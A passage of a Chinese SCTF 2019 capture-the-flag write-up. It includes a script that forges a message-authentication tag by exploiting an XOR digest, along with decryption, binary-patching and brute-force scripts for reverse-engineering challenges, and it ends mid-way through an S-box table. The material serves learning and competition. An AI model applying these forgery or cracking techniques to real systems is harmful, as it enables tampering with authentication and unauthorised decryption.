	print 'so send your message:'
	msg = raw_input()
	print 'and your code:'
	code = raw_input()
	mac.identity(msg.decode('hex'), code)
	exit()
```

先给出了一段明文的 hex 和其加密之后的 hex，然后要求给出一段明文和其对应的密文，然后就就判断其为 “please send me your flag” 且密文正确的话就给出 flag。

这里很有意思的是这里

```
def code(self, msg):
	res = chr(0)*16
	for i in range(len(msg)/16):
		res = strxor(msg[i*16:(i+1)*16], res)
	aes = AES.new(self.key, AES.MODE_CBC, self.iv)
	return aes.encrypt(res).encode('hex')
```

对明文进行异或摘要到 16 位之后，才进行加密的。

那么既然我们已知一组明文和密文，而且可以推算出其异或摘要之后获得的密钥，那么只要让我们传上去的明文摘要之后和前一组明文一致，那么就可以用前一组的密文来通过验证了。

2.对上面这个脚本进行改造，得到如下 POC 生成器，

```
#!/usr/bin/python
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util.strxor import strxor
from Crypto.Random import get_random_bytes
flag = "fuck"

class MAC:
	def __init__(self):
		self.key = get_random_bytes(16)
		self.iv = get_random_bytes(16)

	def pad(self, msg):
		pad_length = 16 - len(msg) % 16
		return msg + chr(pad_length) * pad_length

	def unpad(self, msg):
		return msg[:-ord(msg[-1])]

	def code(self, msg):
		res = chr(0)*16
		# 最终目的 res 相等 24054d4c1a0f19444e0f4016080f1805
		for i in range(len(msg)/16):
			res = strxor(msg[i*16:(i+1)*16], res)
		aes = AES.new(self.key, AES.MODE_CBC, self.iv)
		print(res.encode('hex'))
		return aes.encrypt(res).encode('hex')

	def identity(self, msg, code):
		if self.code(msg) == code:
			msg = self.unpad(msg)
			if msg == 'please send me your flag':
				print 'remote: ok, here is your flag:%s' % flag
			else:
				print 'remote: I got it'
		else:
			print 'remote: hacker!'

if __name__ == '__main__':
	mac = MAC()
	message = 'see you at three o\'clock tomorrow'
	print 'you seem to have intercepted something:{\%s:\%s}' %(mac.pad(message).encode('hex'), mac.code(mac.pad(message)))
	print 'so send your message:'
	msg = 'please send me your flag'
	print(msg)

	msg_o = msg + chr(63 - len(msg)) * (63 - len(msg))
	res = chr(0)*16
	for i in range(len(msg_o)/16 - 1):
		res = strxor(msg_o[i*16:(i+1)*16], res)

	msg_o = msg_o[:32] + strxor("24054d4c1a0f19444e0f4016080f1805".decode('hex'), res) + msg_o[48:]
	print(msg_o.encode('hex'))

	print 'and your code:'
	code = raw_input()
	mac.identity(msg.decode('hex'), code)
	exit()
```

解释一下，可以看到 code 那里我加了个 print ，输出第一组明文的十六位摘要和第二组明文的十六位摘要。

而后对第二组明文进行二次摘要，对其加上一段十六位文本，让其异或之后与第一段明文的十六位摘要相等。再加上 1~15 个 pad，最后处理时利用 pad 保留下我们需要的文本 &#8216;please send me your flag&#8217;。

>【前 32 位不用动】【32~48 位 拿来和前面异或，使得和前面已知密文的明文摘要一致】【48~（49~63） 位 拿来 padding，不是 64 位就是为了让这一段不参与前面的摘要计算，保证最后一位可控】

运行，得到这段明文。

![](https://ctfwp.wetolink.com/2019sctf/58.png)

3.连接靶机，将明文和靶机返回的第一组明文提交，得到 flag。

![](https://ctfwp.wetolink.com/2019sctf/59.png)

4. Flag 到手~


## MISC
作者：De1ta、来源：[安全客](https://www.anquanke.com/post/id/181019)
### 签到
关注公众号，cat /flag

### 头号玩家
一直往上走flag就出来了

![](https://ctfwp.wetolink.com/2019sctf/60.png)

`sctf{You_Are_The_Ready_Player_One!!!For_Sure!!!}`

### Maaaaaaze
找迷宫中任意两点最大路径

最后答案是4056

把html处理一下，然后任意取一个点作为起点，扔到dfs里跑最长路径，等跑不动的时候拿当前最长路径的重点作为起点再扔进去跑，来回几次就得到4056了

exp.py
```
import sys
sys.setrecursionlimit(100000)

file = open("sctfmaze.txt")
maze = [[0 for j in range(0, 100)] for i in range(0, 100)]
vis = [[0 for j in range(0, 100)] for i in range(0, 100)]
class Node:
   t = 0
   r = 0
   b = 0
   l = 0
#print maze
for line in file:
   a = line[:-1].split(" ")
   #print a
   n = Node()
   for i in range(2,len(a)):
       #print a[i],
       if a[i] == '0' :
           n.t = 1
       if a[i] == '1' :
           n.r = 1
       if a[i] == '2' :
           n.b = 1
       if a[i] == '3' :
           n.l = 1
       #print a[i],
   #print
   maze[int(a[0])][int(a[1])] = n
   #print a[0],a[1],maze[int(a[0])][int(a[1])].b
#exit()
def check(i,j):
   if i>=100 or i<0 or j>=100 or j<0:
       return False
   if vis[i][j] == 1:
       return False
   return True

def printmap():
   global vis
   for i in range(0,100):
       for j in range(0,100):
           if vis[i][j] == 1:
               print "%2d%2d" % (i,j)
           print "    "

maxx = 0
print maxx,i,j

def dfs(i,j,n):
   global maxx
   global vis
   global maze
   n += 1

   #print maxx,i,j,n,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l
   if n>maxx:
       print n,i,j
       #print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l

       maxx = n
   if check(i-1,j) and maze[i][j].t == 0:
       vis[i-1][j] = 1
       dfs(i-1,j,n)
       vis[i-1][j] = 0
   if check(i,j+1) and maze[i][j].r == 0:
       vis[i][j+1] = 1
       dfs(i,j+1,n)
       vis[i][j+1] = 0
   if check(i+1,j) and maze[i][j].b == 0:
       vis[i+1][j] = 1
       dfs(i+1,j,n)
       vis[i+1][j] = 0
   if check(i,j-1) and maze[i][j].l == 0:
       vis[i][j-1] = 1
       dfs(i,j-1,n)
       vis[i][j-1] = 0

vis[70][22] = 1
dfs(70,22,0)
exit()

for i in range(0,100):
   for j in range(0,100):
       #print i,j
       vis[i][j] = 1
       dfs(i,j,0)
       vis[i][j] = 0
```
### 打开电动车
根据这篇文章

>http://www.kb-iot.com/post/756.html

可知钥匙信号(PT224X) = 同步引导码(8bit) + 地址位(20bit) + 数据位(4bit) + 停止码(1bit)

用audacity打开信号文件，信号为 `011101001010101001100010`

这里题目截取到的信号中不包括同步码，前20位即为地址码，即为flag

`sctf{01110100101010100110}`

![](https://ctfwp.wetolink.com/2019sctf/61.png)

## Re
作者：De1ta、来源：[安全客](https://www.anquanke.com/post/id/181019)
### Who is he
基于unity开发的游戏，实际只有一个视频播放器，输入框和一个确认框。

找了下资料，默认`<Game>_dataManagedAssembly-CSharp.dll`应该是存放主逻辑的地方。dnspy一把梭。

只是一个DES CBC模式的加密，密文密钥都有，初始iv和key相同。注意C#里面字符串默认是Unicode，密钥是”1234“，每个字符后面都要加”x00”。

```
import base64
from Crypto.Cipher import DES
key = b"1x002x003x004x00"
des = DES.new(key, mode = DES.MODE_CBC, iv = key)
cipher = b"1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA=="
cipher = base64.b64decode(cipher)
plain = des.decrypt(cipher)[0:-8].decode("utf-16")
print(plain)
```
解出来得到

`He_P1ay_Basketball_Very_We11!Hahahahaha!`

交一下发现不对，找了半天好像这个dll里没什么奇怪的地方了。

后面用ce，直接暴力搜索”Emmmmm”

![](https://ctfwp.wetolink.com/2019sctf/62.png)

搜到不止一个结果，在内存中查看一下有新的收获，这里base64的部分和之前dll里的不一样！一共有两个地方不同，先尝试直接解密。第一个得到：

`Oh no!This is a trick!!!`

第二个不知base64改了，key也改成了test。

解密之后得到：

`She_P1ay_Black_Hole_Very_Wel1!LOL!XD!`

提交正确。脚本：

```
import base64
from Crypto.Cipher import DES
key = b"tx00ex00sx00tx00"
# print(a)
# print(key)
des = DES.new(key, mode = DES.MODE_CBC, iv = key)
a = b"xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU="
a = base64.b64decode(a)
res = des.decrypt(a)[0:-6].decode("utf-16")
print(res)
```

继续在ce的内存中翻找，可以看到pe头。把整个dll dump下来，再丢尽dnspy，可以看到内容基本一致。

### Creakme

main开头第一个函数进行SMC。先查找区段.SCTF，然后调用DebugBreak下断点。猜测是通过调试器附加的方式来修改。之后进入`sub_402450`进行SMC。

很容易写个脚本还原：

```
from ida_bytes import get_bytes, patch_bytes
st = 0x404000
key = map(ord,list("sycloversyclover"))
for i in range(512):
    tmp = ord(get_bytes(st,1))
    tmp^=key[i%16]
    tmp = ~tmp
    patch_bytes(st,chr(tmp))
    st+=1
```

修改的函数`sub_404000`在接下来的`sub_4024A0`中被调用到，可以发现它将之后的一串字符串修改为base64字符串

后面加密部分，很容易看出AES CBC，密文密钥初始向量都有

```
from base64 import b64decode
from Crypto.Cipher import AES
key = b"sycloversyclover"
iv = b"sctfsctfsctfsctf"
aes = AES.new(key, mode = AES.MODE_CBC, iv = iv)
res = b"nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo="
cipher = b64decode(res)
tmp = aes.decrypt(cipher)
print(tmp)
```
得到flag:

`sctf{Ae3_C8c_I28_pKcs79ad4}`

### babyre
有几个简单的花指令。

主逻辑很清晰，三部分password。

第一部分为5*5*5的迷宫，wasd上下左右，xy在z轴方向上下移动。

```
*****  *..**  *..**  *****  *****
*****  ****.  *..**  *****  **..*
****.  ****.  ..#*.  *****  *...*
****.  *****  .***.  *****  ..*.*
**s..  *****  .***.  .**..  .**.*
```

直接看出路径来：

`ddwwxxssxaxwwaasasyywwdd`

第二部分就是base64

`c2N0Zl85MTAy`

第三部分为一个简单的对称加密，直接逆回来:

```
#include"stdio.h"
#include"string.h"
#define ROL(x, r)  (((x) << (r)) | ((x) >> (32 - (r))))
#define ROR(x, r)  (((x) >> (r)) | ((x) << (32 - (r))))

unsigned int a[288] = {0x0D6, 0x90, 0x0E9, 0x0FE, 0x0CC, 0x0E1, 0x3D, 0x0B7, 0x16, 0x0B6, 0x14, 0x0C2, 0x28, 0x0FB, 0x2C, 0x5, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0x0BE, 0x4, 0x0C3, 0x0AA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x6, 0x99, 0x9C, 0x42, 0x50, 0x0F4, 0x91, 0x0EF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0x0ED, 0x0CF, 0x0AC, 0x62, 0x0E4, 0x0B3, 0x1C, 0x0A9, 0x0C9, 0x8, 0x0E8, 0x95, 0x80, 0x0DF, 0x94, 0x0FA, 0x75, 0x8F, 0x3F, 0x0A6, 0x47, 0x7, 0x0A7, 0x0FC, 0x0F3, 0x73, 0x17, 0x0BA, 0x83, 0x59, 0x3C, 0x19, 0x0E6, 0x85, 0x4F, 0x0A8, 0x68, 0x6B, 0x81, 0x0B2, 0x71, 0x64, 0x0DA, 0x8B, 0x0F8, 0x0EB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0x0D1, 0x0A2, 0x25, 0x22, 0x7C, 0x3B, 0x1, 0x21, 0x78, 0x87, 0x0D4, 0x0, 0x46, 0x57, 0x9F, 0x0D3, 0x27, 0x52, 0x4C, 0x36, 0x2, 0x0E7, 0x0A0, 0x0C4, 0x0C8, 0x9E, 0x0EA, 0x0BF, 0x8A, 0x0D2, 0x40, 0x0C7, 0x38, 0x0B5, 0x0A3, 0x0F7, 0x0F2, 0x0CE, 0x0F9, 0x61, 0x15, 0x0A1, 0x0E0, 0x0AE, 0x5D, 0x0A4, 0x9B, 0x34, 0x1A, 0x55, 0x0AD, 0x93, 0x32, 0x30, 0x0F5, 0x8C, 0x0B1, 0x0E3, 0x1D, 0x0F6, 0x0E2, 0x2E, 0x82, 0x66, 0x0CA, 0x60, 0x0C0, 0x29, 0x23, 0x0AB, 0x0D, 0x53, 0x4E, 0x6F, 0x0D5, 0x0DB, 0x37, 0x45, 0x0DE, 0x0FD, 0x8E, 0x2F, 0x3, 0x0FF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0x0AF, 0x92, 0x0BB, 0x0DD, 0x0BC, 0x7F, 0x11, 0x0D9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0x0D8, 0x0A, 0x0C1, 0x31, 0x88, 0x0A5, 0x0CD, 0x7B, 0x0BD, 0x2D, 0x74, 0x0D0, 0x12, 0x0B8, 0x0E5, 0x0B4, 0x0B0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0x0B9, 0x0F1, 0x9, 0x0C5, 0x6E, 0x0C6, 0x84, 0x18, 0x0F0, 0x7D, 0x0EC, 0x3A, 0x0DC, 0x4D, 0x20, 0x79, 0x0EE, 0x5F, 0x3E, 0x0D7, 0x0CB, 0x39, 0x48, 0x0C6, 0x0BA, 0x0B1, 0x0A3, 0x50, 0x33, 0x0AA, 0x56, 0x97, 0x91, 0x7D, 0x67, 0x0DC, 0x22, 0x70, 0x0B2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
unsigned int foo2(unsigned int a1)
{
    unsigned v1;
    unsigned char byte[4];
    byte[0] = a1&0xff;
    byte[1] = (a1>>8)&0xff;
    byte[2] = (a1>>16)&0xff;
    byte[3] = (a1>>24)&0xff;
    v1 = (a[byte[0]])|(a[byte[1]]<<8)|(a[byte[2]]<<16)|(a[byte[3]]<<24);
    return ROL(v1,12)^ROL(v1,8)^ROR(v1,2)^ROR(v1,6);
}

unsigned int foo(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4)
{
    return a1 ^ foo2(a2^a3^a4);
}

int main()
{
    unsigned int tmp[30] = {0};
    unsigned int cipher[4] = {0xBE040680, 0xC5AF7647, 0x9FCC401F, 0xD8BF92EF};
    memcpy(tmp+26,cipher,16);

    for(int i = 25;i>=0;i--)
        tmp[i] = foo(tmp[i+4],tmp[i+1],tmp[i+2],tmp[i+3]);
    tmp[4] = 0;
    printf("%sn",(char *)tmp);
    return 0;
}
```

`fl4g_is_s0_ug1y!`

得到flag

`sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)}`

### strange apk
前12个chr
```
            localObject2 = new StringBuilder();
            ((StringBuilder)localObject2).append(paramAnonymousView);
            ((StringBuilder)localObject2).append(str.charAt(i));
            paramAnonymousView = ((StringBuilder)localObject2).toString();
            i++;

if (((String)localObject2).equals("c2N0ZntXM2xjMG1l"))
```
```
>>> base64.b64decode("c2N0ZntXM2xjMG1l")
'sctf{W3lc0me'
```

有个data加密后的，直接虚拟机打开存着解密后的apk，拖下来直接分析。

后18个chr：

这里先用intent启动了其他class：
```
            localObject1 = new Intent();
            ((Intent)localObject1).putExtra("data_return", paramAnonymousView);
            s.this.setResult(-1, (Intent)localObject1);
            s.this.finish();
```
最后一段关键比较：
```
if (f.encode(paramIntent.getStringExtra("data_return"), (String)localObject1).equals("~8t808_8A8n848r808i8d8-8w808r8l8d8}8"))
```
这里生成MD5：
```
 try
      {
        Object localObject2 = MessageDigest.getInstance("MD5");
        ((MessageDigest)localObject2).update("syclover".getBytes());
        BigInteger localBigInteger = new java/math/BigInteger;
        localBigInteger.<init>(1, ((MessageDigest)localObject2).digest());
        localObject2 = localBigInteger.toString(16);
        localObject1 = localObject2;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
```
照着写了个函数：
```
  public static void genMd5(){
    String plaintext = "syclover";
    try{
      MessageDigest m = MessageDigest.getInstance("MD5");
      m.reset();
      m.update(plaintext.getBytes());
      byte[] digest = m.digest();
      BigInteger bigInt = new BigInteger(1,digest);
      String hashtext = bigInt.toString(16);
      System.out.print(hashtext);
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
```
得到`8bfc8af07bca146c937f283b8ec768d4`

那个关键比较有个encode函数：
```
public static String encode(String paramString1, String paramString2)
  {
    int i = paramString1.length();
    int j = paramString2.length();
    StringBuilder localStringBuilder = new StringBuilder();
    for (int k = 0; k < i; k++)
    {
      localStringBuilder.append(paramString1.charAt(k));
      localStringBuilder.append(paramString2.charAt(k / j));
    }
    return localStringBuilder.toString();
  }
```

出题人好像把取整跟取余搞混了。应该是k % j

这样的话，直接在flag里插入8得到字符串：`~8t808_8A8n848r808i8d8-8w808r8l8d8}8`

所以后半段flag：`~t0_An4r0id-w0rld}`

所以整个flag: `sctf{W3lc0me~t0_An4r0id-w0rld}`

### music

![](https://ctfwp.wetolink.com/2019sctf/63.png)
```
cipher =
C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53

len(cipher) = 80
```

用jeb打开，能最终定位到一个关键函数，这个函数输入两个参数

第一个是flag，第二个是hellodsctf字符串的md5，输出为cipher。

直接爆破每一位
```
import java.lang.String;

public class Main {
   public static void main(String[] args) {
       c a = new c();
       String flag = "sctf{";
       String printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;<=>?@[]^_{|}~";
       String ss = "C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53";
       for(int j=0;j<100;j++)
       {
           for(int i=0;i<printable.length();i++)
           {
               String now=  flag + printable.charAt(i);
               //System.out.println(now);
               String d = a.a(now,"E7E64BF658BAB14A25C9D67A054CEBE5");
               if(ss.indexOf(d) == 0)
               {
                   System.out.println("flag: " + now);
                   flag = now;
               }
           }
           //break;
       }
   }
}
```

![](https://ctfwp.wetolink.com/2019sctf/64.png)

### ojbk

>出题人：0xpoker
解题人数：0
最终分数：1000
备注: python加密脚本

```
python import os import sys import struct

big_box = [0x16A7ACAC, 0x47B82F2F, 0xAE316666, 0x89F10101, 0x9A084545, 0xFD985252, 0x3562CCCC, 0x3FDE7575, 0x56F7DCDC, 0x7532BCBC, 0x4FB22121, 0x9359A4A4, 0x03ED5858, 0xB896CACA, 0x3D68C2C2, 0xE26E1F1F, 0xFA700D0D, 0xAF6A8989, 0xEF3AF9F9, 0x67901717, 0xB7749B9B, 0x04050707, 0xA7608787, 0xED8C4E4E, 0x44557777, 0xECD7A1A1, 0xCF12C1C1, 0xF5925C5C, 0xBA207D7D, 0x53A93434, 0x1FF64D4D, 0x88AAEEEE, 0xC4F59797, 0x0ABCB9B9, 0xA48DDFDF, 0x6929A9A9, 0xF4C9B3B3, 0x5C4B6565, 0xDE5D3232, 0x0BE75656, 0x02B6B7B7, 0xB62F7474, 0xF321ECEC, 0x76DFE4E4, 0xEE611616, 0x2A948181, 0xC31DC8C8, 0x6F9A1919, 0x0EB9BEBE, 0xD4E18B8B, 0xF99D5555, 0x63951010, 0x551A8484, 0xB9CD2525, 0xC5AE7878, 0x07E85F5F, 0x8E195E5E, 0x368F9494, 0x1945FDFD, 0xE730F7F7, 0xBF7E9595, 0xC8FA9E9E, 0x2E918686, 0x4EE9CECE, 0x34392323, 0xF8C6BABA, 0x7D38B2B2, 0x38362A2A, 0x85FE0808, 0xF0CCB4B4, 0x43BD2828, 0x50446C6C, 0xCA4C2929, 0xB499C3C3, 0xE9894949, 0xD70CD3D3, 0xD0E48C8C, 0x055EE8E8, 0x3167CBCB, 0x6C774141, 0x181E1212, 0x450E9898, 0xF724EBEB, 0xDF06DDDD, 0x9DE01A1A, 0xBB7B9292, 0xCE492E2E, 0xB5C22C2C, 0x5AF8D5D5, 0x4D049696, 0x1D40FAFA, 0xCDA47676, 0x6B9F1E1E, 0x80A0E0E0, 0x8DF40606, 0xD9B56D6D, 0x96074C4C, 0x95EA1414, 0xA63B6868, 0x52F2DBDB, 0x647D4F4F, 0x92024B4B, 0x13F94444, 0xD5BA6464, 0x9B53AAAA, 0xE4DDAFAF, 0xC6432020, 0x12A2ABAB, 0x9F56ADAD, 0xB3719C9C, 0xBDC82222, 0xA3658080, 0x6D2CAEAE, 0x242D3F3F, 0x303C2424, 0xD2523B3B, 0x6EC1F6F6, 0x81FB0F0F, 0xAA346161, 0x14111B1B, 0x3C332D2D, 0x62CEFFFF, 0x82165757, 0xA9D93939, 0x114FF3F3, 0x3A809D9D, 0x975CA3A3, 0x706C5454, 0xA5D63030, 0x5FA63D3D, 0x49019191, 0x00000000, 0x584E6262, 0x74695353, 0x9CBBF5F5, 0x2BCF6E6E, 0xE335F0F0, 0x8CAFE9E9, 0x72DAE3E3, 0x37D47B7B, 0xA1D33737, 0x834DB8B8, 0x73810C0C, 0x1C1B1515, 0x2979D9D9, 0xAC87D1D1, 0xDA583535, 0x6526A0A0, 0x5D108A8A, 0x4AECC9C9, 0xA882D6D6, 0x5EFDD2D2, 0xDDB06A6A, 0xBC93CDCD, 0x10141C1C, 0xB1C72B2B, 0x4BB72626, 0x28223636, 0x3E859A9A, 0xBE257A7A, 0x86135050, 0x06B3B0B0, 0x2576D0D0, 0xEB3FFEFE, 0x8F42B1B1, 0xE8D2A6A6, 0xB09CC4C4, 0x0FE25151, 0x4C5F7979, 0x7137BBBB, 0x60784848, 0x2D7CDEDE, 0xF27A0303, 0x40507070, 0x015BEFEF, 0x0C0F0909, 0x7F8E0505, 0x229E8F8F, 0x328A9393, 0x77840B0B, 0xFCC3BDBD, 0x17FC4343, 0xD6573C3C, 0xE5864040, 0x7AD0EDED, 0x6123A7A7, 0xDCEB8585, 0x33D17C7C, 0x2FCA6969, 0xFB2BE2E2, 0x2173D7D7, 0x78665A5A, 0x0951E1E1, 0x0D54E6E6, 0x94B1FBFB, 0x1AA8A5A5, 0x2C273131, 0x8A1C5959, 0x269B8888, 0xEA641111, 0x7ED5EAEA, 0x1BF34A4A, 0x3BDB7272, 0x1EADA2A2, 0xA23E6F6F, 0xF1975B5B, 0x42E6C7C7, 0x54416B6B, 0x66CBF8F8, 0x90B4FCFC, 0xFF2EE5E5, 0x6AC4F1F1, 0xC2462727, 0xA088D8D8, 0xC9A17171, 0xCCFF9999, 0x7C635D5D, 0x59158D8D, 0xE66B1818, 0x396DC5C5, 0x23C56060, 0x84A5E7E7, 0xAB6F8E8E, 0xE1834747, 0x57AC3333, 0xB22A7373, 0x8B47B6B6, 0xFE750A0A, 0x20283838, 0xCB17C6C6, 0xADDC3E3E, 0x511F8383, 0xE0D8A8A8, 0xF67F0404, 0x793DB5B5, 0x154AF4F4, 0x68724646, 0x99E51D1D, 0x7B8B0202, 0xC718CFCF, 0x46E3C0C0, 0x485A7E7E, 0x98BEF2F2, 0xD8EE8282, 0x410B9F9F, 0x9E0D4242, 0xC0F09090, 0x080A0E0E, 0xDB03DADA, 0x27C06767, 0x5BA33A3A, 0xD309D4D4, 0x8748BFBF, 0xC1AB7F7F, 0x91EF1313, 0xD1BF6363, 0x9B9B74B7, 0x3131272C, 0xB6B6478B, 0x94948F36, 0x77775544, 0x29294CCA, 0x7E7E5A48, 0xEDEDD07A, 0x4444F913, 0x59591C8A, 0x8D8D1559, 0xE4E4DF76, 0x07070504, 0x9D9D803A, 0xC2C2683D, 0x2626B74B, 0x19199A6F, 0xB5B53D79, 0xA6A6D2E8, 0x8C8CE4D0, 0xDDDD06DF, 0x50501386, 0x05058E7F, 0x6767C027, 0x0D0D70FA, 0xD6D682A8, 0xEAEAD57E, 0xADAD569F, 0x53536974, 0x7D7D20BA, 0x6969CA2F, 0x7575DE3F, 0x161661EE, 0xDBDBF252, 0xD0D07625, 0xFEFE3FEB, 0x98980E45, 0xBDBDC3FC, 0xCFCF18C7, 0xBFBF4887, 0xA2A2AD1E, 0x04047FF6, 0x23233934, 0x4A4AF31B, 0x92927BBB, 0x10109563, 0xA3A35C97, 0xA4A45993, 0x24243C30, 0xF7F730E7, 0x4E4E8CED, 0x0808FE85, 0x6060C523, 0x3D3DA65F, 0x5D5D637C, 0x6A6AB0DD, 0x616134AA, 0x73732AB2, 0xE3E3DA72, 0x2B2BC7B1, 0x3939D9A9, 0xE7E7A584, 0x91910149, 0x38382820, 0xBCBC3275, 0xCDCD93BC, 0xFDFD4519, 0x5656E70B, 0xF9F93AEF, 0xB2B2387D, 0x65654B5C, 0x8F8F9E22, 0x494989E9, 0x5B5B97F1, 0x525298FD, 0x2C2CC2B5, 0x8686912E, 0xCACA96B8, 0x0B0B8477, 0x7C7CD133, 0x32325DDE, 0x3B3B52D2, 0xFAFA401D, 0x5C5C92F5, 0x00000000, 0x5F5FE807, 0xCBCB6731, 0xD7D77321, 0x2A2A3638, 0x7878AEC5, 0xCCCC6235, 0x6C6C4450, 0xABABA212, 0x4141776C, 0x3A3AA35B, 0xE2E22BFB, 0xDCDCF756, 0x36362228, 0x7A7A25BE, 0x62624E58, 0xF3F34F11, 0xEEEEAA88, 0x7F7FABC1, 0xC0C0E346, 0x0F0FFB81, 0x9C9C71B3, 0x18186BE6, 0x7272DB3B, 0x6363BFD1, 0x5A5A6678, 0xACACA716, 0x3737D3A1, 0xB4B4CCF0, 0xA1A1D7EC, 0x1B1B1114, 0xE8E85E05, 0x2E2E49CE, 0x8A8A105D, 0x89896AAF, 0x4545089A, 0x4B4B0292, 0xD2D2FD5E, 0x79795F4C, 0x9090F0C0, 0x02028B7B, 0x0606F48D, 0x03037AF2, 0x83831F51, 0x1E1E9F6B, 0x9999FFCC, 0xBBBB3771, 0xC7C7E642, 0x1313EF91, 0x9797F5C4, 0x3333AC57, 0x808065A3, 0xAFAFDDE4, 0x9F9F0B41, 0x6B6B4154, 0x0101F189, 0x8282EED8, 0x8B8BE1D4, 0x12121E18, 0x353558DA, 0xF1F1C46A, 0x0E0E0A08, 0x1A1AE09D, 0xA5A5A81A, 0x7B7BD437, 0x404086E5, 0xAEAE2C6D, 0xF0F035E3, 0xC6C617CB, 0x55559DF9, 0xE0E0A080, 0xC1C112CF, 0x95957EBF, 0x15151B1C, 0x5151E20F, 0xAAAA539B, 0xA8A8D8E0, 0x8E8E6FAB, 0x9696044D, 0xD5D5F85A, 0xFCFCB490, 0x6D6DB5D9, 0xDFDF8DA4, 0xDEDE7C2D, 0x3C3C57D6, 0x9A9A853E, 0xA7A72361, 0x09090F0C, 0xD3D30CD7, 0x272746C2, 0x57571682, 0x2525CDB9, 0x17179067, 0x666631AE, 0x48487860, 0xB8B84D83, 0x3E3EDCAD, 0x0C0C8173, 0xBABAC6F8, 0xB1B1428F, 0xB9B9BC0A, 0x54546C70, 0x42420D9E, 0x2121B24F, 0x8181942A, 0xE1E15109, 0x84841A55, 0xF4F44A15, 0xB7B7B602, 0xE9E9AF8C, 0xB3B3C9F4, 0x70705040, 0xEBEB24F7, 0xD9D97929, 0xF5F5BB9C, 0x93938A32, 0x5858ED03, 0xEFEF5B01, 0x2D2D333C, 0x474783E1, 0xF6F6C16E, 0xFFFFCE62, 0x6464BAD5, 0x0A0A75FE, 0x7676A4CD, 0xCECEE94E, 0x88889B26, 0x1C1C1410, 0x46467268, 0x4C4C0796, 0xFBFBB194, 0x878760A7, 0x4F4F7D64, 0x3030D6A5, 0xBEBEB90E, 0x74742FB6, 0x2F2FB847, 0x5E5E198E, 0x3F3F2D24, 0xC9C9EC4A, 0xD1D187AC, 0xD8D888A0, 0xECEC21F3, 0xE6E6540D, 0x2828BD43, 0x6E6ECF2B, 0x1D1DE599, 0x1414EA95, 0x1F1F6EE2, 0x2222C8BD, 0xA9A92969, 0x68683BA6, 0xF8F8CB66, 0xC5C56D39, 0x3434A953, 0xC3C399B4, 0x202043C6, 0xB0B0B306, 0xF2F2BE98, 0xC8C81DC3, 0x4D4DF61F, 0xDADA03DB, 0x7171A1C9, 0xE5E52EFF, 0xD4D409D3, 0xC4C49CB0, 0x9E9EFAC8, 0x6F6F3EA2, 0x4343FC17, 0x8585EBDC, 0xA0A02665, 0x111164EA, 0xE3C046E3, 0x6087A760, 0xE48CD0E4, 0x2F74B62F, 0x50704050, 0xFF99CCFF, 0x04964D04, 0xD939A9D9, 0x82D6A882, 0x5835DA58, 0x5A7E485A, 0xB06ADDB0, 0x6B18E66B, 0x975BF197, 0xA171C9A1, 0xCF6E2BCF, 0xEA1495EA, 0xB7264BB7, 0x719CB371, 0xED5803ED, 0xE9CE4EE9, 0xF64D1FF6, 0xCEFF62CE, 0x30F7E730, 0x9B88269B, 0x3166AE31, 0x207DBA20, 0x68C23D68, 0x362A3836, 0x91862E91, 0x6DC5396D, 0x6580A365, 0xC56023C5, 0x925CF592, 0xF4068DF4, 0x635D7C63, 0xB82F47B8, 0x38B27D38, 0x8E057F8E, 0x8640E586, 0xA8A51AA8, 0x18CFC718, 0xB1FB94B1, 0xA93453A9, 0x28382028, 0xD2A6E8D2, 0xC22CB5C2, 0xDAE372DA, 0xAE78C5AE, 0xDB723BDB, 0xB56DD9B5, 0xEE82D8EE, 0x3AF9EF3A, 0x5F794C5F, 0xA2AB12A2, 0x42B18F42, 0x32BC7532, 0x859A3E85, 0xF7DC56F7, 0x2EE5FF2E, 0x55774455, 0x79D92979, 0x87D1AC87, 0xA0E080A0, 0x93CDBC93, 0xBD2843BD, 0x5EE8055E, 0x96CAB896, 0x0A0E080A, 0xCBF866CB, 0x8347E183, 0xFB0F81FB, 0x2D3F242D, 0x416B5441, 0xF94413F9, 0xF34A1BF3, 0x6A89AF6A, 0x5BEF015B, 0x7D4F647D, 0xF090C0F0, 0x5CA3975C, 0xC9B3F4C9, 0x16578216, 0x27312C27, 0x4FF3114F, 0x37BB7137, 0xFDD25EFD, 0x7F04F67F, 0x665A7866, 0xC822BDC8, 0xBF63D1BF, 0xD17C33D1, 0x0E98450E, 0x62CC3562, 0x141C1014, 0x6116EE61, 0xAC3357AC, 0x26A06526, 0xE51D99E5, 0x51E10951, 0x3C24303C, 0x0CD3D70C, 0x17C6CB17, 0x40FA1D40, 0x6C54706C, 0x2A73B22A, 